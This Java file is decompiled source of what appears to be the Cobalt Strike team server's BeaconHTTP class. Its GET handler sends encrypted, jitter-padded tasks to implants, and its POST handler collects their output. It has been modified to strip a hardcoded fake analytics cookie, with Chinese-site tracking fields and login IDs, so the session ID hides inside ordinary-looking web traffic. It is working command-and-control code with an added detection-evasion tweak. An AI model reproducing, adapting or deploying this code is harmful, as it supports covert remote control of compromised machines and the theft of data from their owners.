//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package beacon;

import c2profile.MalleableHook;
import c2profile.Profile;
import common.BeaconEntry;
import common.CommonUtils;
import common.MudgeSanity;
import common.ScListener;
import java.io.InputStream;
import java.util.Properties;
import server.ServerUtils;

public class BeaconHTTP {
    private static final boolean A = B();
    protected MalleableHook.MyHook geth = new _A();
    protected MalleableHook.MyHook posth = new _B();
    protected BeaconC2 controller;
    protected Profile c2profile;
    protected ScListener listener;
    protected int datajitter;

    public BeaconHTTP(ScListener var1, Profile var2, BeaconC2 var3) {
        this.c2profile = var2;
        this.controller = var3;
        this.listener = var1;
        this.datajitter = var2.getInt(".data_jitter");
    }

    private static final boolean B() {
        return true;
    }

    public MalleableHook.MyHook getGetHandler() {
        return this.geth;
    }

    public MalleableHook.MyHook getPostHandler() {
        return this.posth;
    }

    protected String getPostedData(Properties var1) {
        if (var1.containsKey("input") && var1.get("input") instanceof InputStream) {
            InputStream var2 = (InputStream)var1.get("input");
            byte[] var3 = CommonUtils.readAll(var2);
            String var4 = CommonUtils.bString(var3);
            return var4;
        } else {
            return "";
        }
    }

    public byte[] getNullJitterTask(int var1) {
        if (var1 <= 8) {
            return new byte[0];
        } else {
            byte[] var2 = CommonUtils.randomData(CommonUtils.rand(var1 - 8));
            CommandBuilder var3 = new CommandBuilder();
            var3.setCommand(6);
            var3.addString(var2);
            return var3.build();
        }
    }

    private class _B implements MalleableHook.MyHook {
        private _B() {
        }

        public byte[] serve(String var1, String var2, Properties var3, Properties var4) {
            try {
                String var5 = "";
                String var6 = ServerUtils.getRemoteAddress(BeaconHTTP.this.c2profile, var3);
                String var7 = BeaconHTTP.this.getPostedData(var4);
                var5 = new String(BeaconHTTP.this.c2profile.recover(".http-post.client.id", var3, var4, var7, var1));

                int lastSlashIndex = var5.lastIndexOf("-195eb4fb9b75a2");
                if(lastSlashIndex != -1) {
                    var5 = var5.replace("-195eb4fb9b75a2%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%A4%BE%E4%BA%A4%E7%BD%91%E7%AB%99%E6%B5%81%E9%87%8F%22%7D%2C%22identities%22%3A%22gfGHDWRlbnRpdHlfY29va2fgTHlkIjoiMTk1ZWI0ZmI5YjYxZDQtMGI2NGM4ZGRlZmQ4YWI4LWY1MzU3MjYtMTMyNzEwNC0xOTVlYjRmYjliNzVhMiIsIiRpZGVudGl0eV9sb2dpbl9pZCI6IjEwMDAxNjYwODkyNyJ9%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%24identity_login_id%22%2C%22value%22%3A%22986016608927%22%7D%2C%22%24device_id%22%3A%22987e987b9b61d4-0b64c8ddefd8ab8-f535726-1327104-195eb4fb9b75a2%22%7D%3B%20intl%3D1%3B%20_ga%3DGA1.2.694542975.1743409626%3B%20_gcl_au%3D1.1.2008969992.1743409626%3B%20qcstats_seo_keywords%3D%E5%93%81%E7%89%8C%E8%AF%8D-%E5%93%81%E7%89%8C%E8%AF%8D-%E7%99%BB%E5%BD%95%3B%20", "");
                }

                if (var5.length() == 0) {
                    CommonUtils.print_error("HTTP " + var2 + " to " + var1 + " from " + var6 + " has no session ID! This could be an error (or mid-engagement change) in your c2 profile");
                    MudgeSanity.debugRequest(".http-post.client.id", var3, var4, var7, var1, var6);
                } else if (!CommonUtils.isNumber(var5)) {
                    CommonUtils.print_error("HTTP " + var2 + " to " + var1 + " from " + var6 + " has corrupt session ID '" + var5 + "'! This could be an error (or mid-engagement change) in your c2 profile");
                    MudgeSanity.debugRequest(".http-post.client.id", var3, var4, var7, var1, var6);
                } else {
                    byte[] var8 = CommonUtils.toBytes(BeaconHTTP.this.c2profile.recover(".http-post.client.output", var3, var4, var7, var1));
                    if (var8.length == 0 || !BeaconHTTP.this.controller.process_beacon_data(var5, var8)) {
                        MudgeSanity.debugRequest(".http-post.client.output", var3, var4, var7, var1, var6);
                    }
                }
            } catch (Exception var9) {
                MudgeSanity.logException("beacon post handler", var9, false);
            }

            return BeaconHTTP.this.datajitter == 0 ? new byte[0] : CommonUtils.randomData(CommonUtils.rand(BeaconHTTP.this.datajitter));
        }

        _B(Object var2) {
            this();
        }
    }

    private class _A implements MalleableHook.MyHook {
        private _A() {
        }

        public byte[] serve(String var1, String var2, Properties var3, Properties var4) {
            String var5 = ServerUtils.getRemoteAddress(BeaconHTTP.this.c2profile, var3);
            String var6 = BeaconHTTP.this.c2profile.recover(".http-get.client.metadata", var3, var4, BeaconHTTP.this.getPostedData(var4), var1);
            if (var6.length() != 0 && var6.length() == 128) {
                BeaconEntry var7 = BeaconHTTP.this.controller.process_beacon_metadata(BeaconHTTP.this.listener, var5, CommonUtils.toBytes(var6), (String)null, 0);
                if (var7 == null) {
                    MudgeSanity.debugRequest(".http-get.client.metadata", var3, var4, "", var1, var5);
                    return new byte[0];
                } else {
                    byte[] var8 = BeaconHTTP.this.controller.dump(var7.getId(), 921600, 1048576);
                    int var9 = 921600 - var8.length;
                    if (BeaconHTTP.this.datajitter > 0 && var9 >= 10) {
                        int var10 = BeaconHTTP.this.datajitter;
                        if (var10 > var9) {
                            var10 = var9;
                        }

                        var8 = CommonUtils.join(var8, BeaconHTTP.this.getNullJitterTask(var10));
                    }

                    if (var8.length > 0) {
                        byte[] var11 = BeaconHTTP.this.controller.getSymmetricCrypto().encrypt(var7.getId(), var8);
                        return var11;
                    } else {
                        return new byte[0];
                    }
                }
            } else {
                CommonUtils.print_error("Invalid session id");
                MudgeSanity.debugRequest(".http-get.client.metadata", var3, var4, "", var1, var5);
                return new byte[0];
            }
        }

        _A(Object var2) {
            this();
        }
    }
}
